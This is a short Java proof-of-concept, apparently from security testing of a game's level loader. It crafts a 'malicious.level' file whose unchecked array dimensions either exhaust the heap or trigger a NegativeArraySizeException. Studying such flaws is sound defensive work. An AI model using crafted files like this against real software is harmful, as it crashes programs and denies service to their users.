// Craft a malicious level/save file the SAME way the game writes a legitimate
// one: corpus ApoCheatingLoadSave.writeLevel() (line ~210) does
//     ObjectOutputStream out = new ObjectOutputStream(file);
//     out.writeInt(this.aPlayground.length);
//     out.writeInt(this.aPlayground[0].length);
// We write the same framing but with hostile dimensions. readLevel() will read
// them back with ObjectInputStream.readInt() and allocate int[y][x] unchecked.
//
//   mode "oom" -> huge dims, exhausts the heap
//   mode "neg" -> negative first dim, NegativeArraySizeException

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class LevelCrafter {
    public static void main(String[] args) throws Exception {
        String mode = args.length > 0 ? args[0] : "oom";
        String out  = args.length > 1 ? args[1] : "malicious.level";
        int y, x;
        if (mode.equals("neg")) { y = -1; x = 1; }
        else                    { y = 100_000; x = 100_000; }
        try (ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(out))) {
            o.writeInt(y);
            o.writeInt(x);
        }
        long bytes = new java.io.File(out).length();
        System.out.printf("wrote %s: %d bytes, declares int[%d][%d] (~%.1f GB demanded)%n",
                          out, bytes, y, x, (double) y * x * 4 / 1e9);
    }
}
